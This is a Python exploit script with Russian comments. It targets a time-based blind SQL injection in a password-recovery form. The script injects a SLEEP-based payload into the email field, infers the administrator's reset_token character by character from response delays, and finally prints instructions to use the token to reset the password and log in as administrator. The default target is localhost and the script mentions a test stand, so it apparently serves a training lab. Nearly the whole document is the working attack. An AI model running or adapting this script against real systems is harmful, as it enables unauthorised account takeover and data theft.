"""
вытаскивает reset_token администратора из формы восстановления
пароля (POST /forgot, параметр email), ориентируясь ТОЛЬКО на время ответа
сервера. Прямого вывода данных на странице нет - инъекция слепая, поэтому
задаём базе вопросы "да/нет" и читаем ответ по задержке
"""
import sys
import time
import urllib.request
import urllib.parse

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
URL = BASE + "/forgot"
TARGET_USER = "administrator"     # чей токен вытаскиваем
SLEEP = 1.5                       # на сколько "усыпляем" БД при истинном условии
CHARSET = "0123456789abcdef"      # reset_token состоит из hex-символов
MAXLEN = 40                       # предел перебора длины

# подзапрос, который достаёт нужный токен из базы
TOKEN_SQ = f"(SELECT reset_token FROM users WHERE username='{TARGET_USER}')"


def request_time(email_value):
    """Отправляет значение email в форму и возвращает время ответа (секунды)"""
    data = urllib.parse.urlencode({"email": email_value}).encode()
    t0 = time.perf_counter()
    try:
        urllib.request.urlopen(URL, data=data, timeout=SLEEP + 20).read()
    except Exception as e:
        print("  [!] ошибка запроса:", e)
    return time.perf_counter() - t0


def is_true(cond, threshold):
    """True, если условие cond истинно (ответ пришёл с задержкой)."""
    payload = f"zzz' OR (SELECT CASE WHEN ({cond}) THEN SLEEP({SLEEP}) ELSE 0 END)-- -"
    if request_time(payload) <= threshold:
        return False
    # подтверждаем "медленный" ответ ещё раз (защита от случайного лага сети)
    return request_time(payload) > threshold


def extract():
    # Базовое время обычного (быстрого) запроса и порог "медленно"
    base = min(request_time("zzz") for _ in range(3))
    threshold = base + SLEEP * 0.5
    print(f"[i] базовое время ответа ~{base:.3f}s, порог 'медленно' = {threshold:.3f}s\n")

    #длина токена (спрашиваем LENGTH(...) == n, пока не получим 'да')
    print("[*] определяю длину токена...")
    length = None
    for n in range(1, MAXLEN + 1):
        if is_true(f"LENGTH({TOKEN_SQ})={n}", threshold):
            length = n
            break
    if not length:
        print("[!] длину определить не удалось. Проверь, что стенд запущен и SAFE_MODE=false")
        return None
    print(f"[+] длина токена: {length}\n")

    # посимвольный перебор
    print("[*] вытаскиваю токен по символам...")
    token = ""
    for pos in range(1, length + 1):
        ch = ""
        for c in CHARSET:
            if is_true(f"SUBSTRING({TOKEN_SQ},{pos},1)='{c}'", threshold):
                ch = c
                break
        token += ch or "?"
        print(f"    [{pos:>2}/{length}] {token}")
    return token


def main():
    print(f"Эксфильтрация reset_token пользователя '{TARGET_USER}'")
    print(f"    цель: {URL}\n")
    token = extract()
    if not token:
        return
    print(f"\n[+] КРАСАВА. reset_token: {token}")
    print(f"[i] Теперь открой да  {BASE}/reset?token={token}")
    print(f"    задай новый пароль и войди как {TARGET_USER}.")


if __name__ == "__main__":
    main()
